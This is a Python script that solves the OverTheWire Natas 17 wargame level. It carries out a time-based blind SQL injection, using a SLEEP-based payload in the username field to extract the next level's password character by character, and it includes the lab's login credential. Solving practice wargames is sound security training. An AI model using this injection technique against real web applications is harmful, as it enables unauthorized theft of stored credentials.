import requests
import re
import time

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

url = "http://natas17.natas.labs.overthewire.org"

password = ""

for i in range(1, 33):
	for char in characters:
		payload = f'natas18" AND BINARY SUBSTRING(password, {i}, 1)="{char}" AND SLEEP(2)#'
		start = time.time()
		response = requests.post(url, data={"username": payload},auth=auth)
		duration = time.time() - start
     		
		print(f"[{i}/32] Trying: {char} -> {duration:.2f}s")
     		
		if duration > 1.8: #sleep was triggered
			password += char
			print(f"Found password so far: {password}")
			break
     			
print(f"\nFound full password: {password}")
